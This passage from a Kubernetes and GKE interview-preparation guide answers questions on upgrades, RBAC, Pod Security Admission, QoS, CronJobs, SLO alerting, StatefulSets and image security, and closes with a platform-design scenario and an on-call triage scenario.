> **Control plane first** — version skew allows the kubelet to be ≤3 minor versions behind the API server and **never ahead**. Then nodes: **surge upgrade** (`maxSurge=1, maxUnavailable=0`, capacity never dips, **not rollback-able**) or **blue/green node pool upgrade** (a full second pool, soak period, `gcloud container node-pools rollback` in minutes — 2× cost, fully reversible). PDBs gate every drain; a PDB with 0 allowed disruptions stalls the whole thing and GKE force-deletes after ~1h. *(Part 17)*

**What's the difference between a ClusterRole+RoleBinding and a ClusterRole+ClusterRoleBinding?**
> `ClusterRole` + **RoleBinding** = define the rules **once**, grant them **within one namespace**. That's the multi-tenant pattern — one `developer` ClusterRole, 50 RoleBindings. `ClusterRole` + `ClusterRoleBinding` = cluster-wide. And `Role` + `ClusterRoleBinding` **does not exist**.
>
> Gotcha: a RoleBinding to a ClusterRole that grants a **cluster-scoped** resource (nodes, PVs) grants **nothing** — silently, no error. *(Part 3)*

**Is a namespace a security boundary?**
> **No.** It's a scope for names, RBAC and quota. By default any pod in any namespace can open a TCP connection to any pod in any other. Nodes are shared. CoreDNS resolves everything for everyone. A namespace becomes a boundary only with **RBAC + ResourceQuota + NetworkPolicy + PSA (+ separate node pools)**. For genuinely untrusted tenants: **separate clusters**, or gVisor. *(Part 3)*

**Why did PodSecurityPolicy get removed?**
> When multiple PSPs matched a pod, the **ordering was non-deterministic** — you couldn't reason about which policy applied or what it mutated. And it was authorised against the pod's **ServiceAccount**, which is the wrong subject in most real cases. **PSA** is deliberately dumber: three fixed levels (`privileged`/`baseline`/`restricted`), three modes (`enforce`/`audit`/`warn`), per namespace by label. Less flexible, actually comprehensible. *(Part 3)*

**How do you roll out `restricted` PSA without breaking prod?**
> `enforce: baseline` + `warn: restricted` + `audit: restricted` — enforce what survives today, warn on where you're going. And `kubectl label --dry-run=server --overwrite ns X pod-security.kubernetes.io/enforce=restricted` returns **the list of currently-running pods that would violate**. PSA only evaluates at **pod creation**, so a naive relabel looks fine until 03:00 when a node dies and the ReplicaSet can't replace a pod. *(Part 3)*

**What are the QoS classes and how are they assigned?**
> Derived by the kubelet, never declared. **Guaranteed** = requests == limits for **both** CPU and memory on **every** container. **Burstable** = some requests, not equal. **BestEffort** = nothing set. Eviction order under memory pressure: BestEffort → Burstable-over-request → Guaranteed. Guaranteed gets `oom_score_adj: -997` and, under the static CPU manager policy, **exclusive pinned cores** — which is the latency argument, not just the eviction one. *(Part 3)*

**What's the resource accounting rule for init containers?**
> The pod's effective request is **`max(largest init container, sum of app containers)`**, not the sum of everything — because inits run **sequentially** and are finished before the app containers start, so the scheduler only reserves the peak. *(Part 7)*

**How do you run a sidecar that starts before the app and doesn't block a Job from completing?**
> **Native sidecars** (beta/default 1.29+): an **init container with `restartPolicy: Always`**. It starts in the init sequence (so it's up first), keeps running alongside the app, terminates after it, and **doesn't block Job completion** — which was the years-long Istio-plus-Jobs problem. *(Part 7)*

**Your CronJob stopped running and nobody changed anything.**
> **The 100-missed-schedules rule.** With no `startingDeadlineSeconds`, the controller counts missed schedules from `lastScheduleTime`; past **100**, it logs `too many missed start times (> 100)` and **gives up permanently**. Suspend a `*/1` CronJob for two hours and it's dead. Setting `startingDeadlineSeconds` bounds the lookback. Also: `concurrencyPolicy` defaults to **`Allow`**, which turns one slow run into five concurrent copies DoSing your own database. *(Part 16)*

**Explain multi-window multi-burn-rate alerting.**
> Don't alert on the error rate; alert on **how fast you're consuming the error budget**. 99.9% SLO → 0.1% budget. **Burn rate = error rate ÷ budget rate**; burn rate 1 = budget gone in exactly 30 days; **14.4× = gone in ~2 days → page**. Standard table: 14.4× (1h/5m) page, 6× (6h/30m) ticket, 3× (1d/2h), 1× (3d/6h).
>
> **Why two windows AND-ed?** The **long** window gives significance (won't fire on a 30s blip); the **short** window gives fast **resolution** (the alert clears when the problem stops, instead of a one-hour tail that trains on-call to ignore it). *(Part 16)*

**What kills Prometheus?**
> **Cardinality.** Every unique label combination is a separate in-memory time series. A `user_id` or a raw URL path in a label → millions of series → OOMKill. Our metric is `shopwave_requests_total{service, method, endpoint, status}` where `endpoint` is the **templated route** (`/api/products/:sku`), not the SKU — 40 series instead of 40,000. **High-cardinality identifiers belong in logs and traces, never in metric labels.** *(Part 16)*

**The whole cluster is rejecting object creation. What did you do?**
> Two classics: **(1)** an admission webhook with **`failurePolicy: Fail`** that's unreachable — on a private GKE cluster, usually the **master→node firewall** not opening the webhook's port (GKE's auto rule only opens 443 and 10250; cert-manager uses 9443, Istio 15017). Nothing can be created **including the fix**. **(2)** Binary Authorization enforced **without whitelisting `gke.gcr.io/*`** — GKE's own system pods are blocked and the cluster can't heal itself. Hence: **DRYRUN first, always.** *(Parts 1, 6, 18)*

**Why is `--force --grace-period=0` dangerous?**
> It deletes the **pod object from etcd** without waiting for the kubelet to confirm the container is gone. For a Deployment that's rude. **For a StatefulSet it risks split-brain**: the object is gone, so the controller creates `postgres-0` on another node while the original container is **still running and still holding the RWO disk**. Two writers. Only ever do it when you have **verified the node is truly dead**. *(Part 7)*

**Why does moving `postgres-0` take minutes?**
> The PD is **ReadWriteOnce**. It must **detach** from the old node before it can **attach** to the new one, which takes 30–60s and **cannot start until the old pod fully terminates**. If the old kubelet is unresponsive, you wait out a ~6-minute force-detach timeout. *(Part 17)*

**How do you canary a StatefulSet?**
> **`updateStrategy.rollingUpdate.partition`** — only pods with ordinal ≥ partition are updated. Set `partition: 2` on a 3-replica set, verify `postgres-2`, then 1, then 0. For a primary-at-0 topology this means **you always canary on a replica before touching the primary**. `OnDelete` is the manual escape hatch where you choose the failover moment. *(Part 12)*

**What's the difference between `maxSkew: 1, DoNotSchedule` and `ScheduleAnyway`?**
> Hard vs soft. And the real answer is **why the same field differs between services**: `payments`/`orders`/`redis` get `DoNotSchedule` (I'd rather have 2 correctly-spread replicas than 3 where a zone failure takes 2), `frontend`/`catalog` get `ScheduleAnyway` (a slightly imbalanced storefront beats an unschedulable one). Also **`minDomains: 3`** — without it, if only one zone has nodes, skew is trivially 0 and **everything lands in one zone while Kubernetes reports success**. *(Part 13)*

**Why doesn't Kubernetes rebalance pods?**
> Because **`IgnoredDuringExecution`** — placement rules are never re-evaluated after scheduling. `RequiredDuringExecution` has been planned for years and doesn't exist. The answer is the **descheduler**: an external CronJob that **evicts** pods (it never schedules) so the scheduler gets another go. Plugins: `RemoveDuplicates`, `LowNodeUtilization`, `RemovePodsViolatingTopologySpreadConstraint`. *(Part 13)*

**How do you prevent an image from being re-pointed under you?**
> **`--immutable-tags`** on the Artifact Registry repo, plus **digest pinning** (`image@sha256:...` — content-addressed, cannot be re-pointed), plus **Binary Authorization** (an admission webhook requiring a KMS-signed attestation over the digest, so an image built on a laptop cannot run in prod regardless of RBAC). And **never `latest`**: it's not a version, it silently flips `imagePullPolicy` to `Always`, and tags are mutable. *(Parts 5, 6)*

**What's the PID 1 problem?**
> Three things. **(1)** Shell-form `ENTRYPOINT` makes `/bin/sh` PID 1, and **sh does not forward signals** — so your app **never receives SIGTERM**, the kubelet waits out the full grace period and SIGKILLs, and every graceful-shutdown handler you wrote is silently dead. Use **exec form**. **(2)** PID 1 has **no default signal handlers** — the kernel ignores signals with no explicit handler, so you must install one. **(3)** PID 1 must **reap zombies** or you exhaust the PID limit; use `tini` if your app forks. *(Part 5)*

## 19.3 Scenario questions

**"Design the platform for a payments-adjacent service on GKE."**

> Cluster: **regional** (3 control-plane replicas), **private nodes**, **VPC-native** with a generously-sized pod CIDR, **Dataplane V2**, **Workload Identity**, **shielded nodes**, **release channel `regular`** with a maintenance window and peak exclusions.
>
> Namespace: PSS `enforce: baseline`, `warn: restricted`; ResourceQuota (including `services.nodeports: 0` and a **scoped quota on the critical PriorityClass**); LimitRange so quota doesn't reject unrequested pods.
>
> Workload: **Guaranteed QoS**, `priorityClassName: shopwave-critical`, **required** pod anti-affinity on hostname, `topologySpreadConstraints` `DoNotSchedule` across zones with `minDomains: 3`, PDB `minAvailable: 2`, `maxSurge: 1 / maxUnavailable: 0`, `minReadySeconds: 15`, `terminationGracePeriodSeconds` > preStop + drain.
>
> Identity: dedicated ServiceAccount, `automountServiceAccountToken: false`, **Workload Identity** to Secret Manager, secret via **CSI driver** (nothing in etcd), and the app **re-reads the file** so rotation works.
>
> Image: **distroless**, numeric non-root UID, `readOnlyRootFilesystem`, `drop: ALL`, `no_new_privs`, `RuntimeDefault` seccomp, **digest-pinned**, **Binary-Authorization-attested**, `httpGet` preStop (no shell!).
>
> Network: **default-deny** NetworkPolicy; ingress from **exactly one** service; egress to `0.0.0.0/0:443` **with `except` for all RFC1918 + link-local** so "internet only" actually means internet only.
>
> Observability: RED metrics with **templated route labels**, **multi-window multi-burn-rate** SLO alerts, `inhibit_rules` so one outage is one page.
>
> Day 2: **blue/green node pool upgrades** (rollback-able), VolumeSnapshots with `--locked` retention, **timed quarterly restore drills**, audit-logged break-glass RBAC.

**"You're on call. Checkout is failing. Go."**

> 1. **Scope it**: is it all users or some? `kubectl get pods -n shopwave-prod` — anything not Ready, anything restarting?
> 2. **Recent change?** `kubectl rollout history deploy/orders` and the RS creation timestamps. **Most incidents are a deploy.** If yes: `kubectl rollout undo`, *then* investigate.
> 3. **Follow the dependency chain**, checking readiness at each hop: frontend → orders → payments/cart → postgres/redis. `describe pod` for readiness failures; that tells you which hop is unhappy.
> 4. **Not a deploy?** Check the four usual suspects: an OOMKill loop (`lastState.terminated.reason`), a saturated dependency (`shopwave_orders_inflight` pinned, HPA at max), **CFS throttling** (p99 bad, CPU low), or a node problem (`DiskPressure`, `Ready=Unknown`).
> 5. **Mitigate before you diagnose.** Roll back, scale up, shed load, disable the CronJob. The postmortem is later; the users are now.
> 6. **Write it down as you go.** The timeline is worth more than the fix.

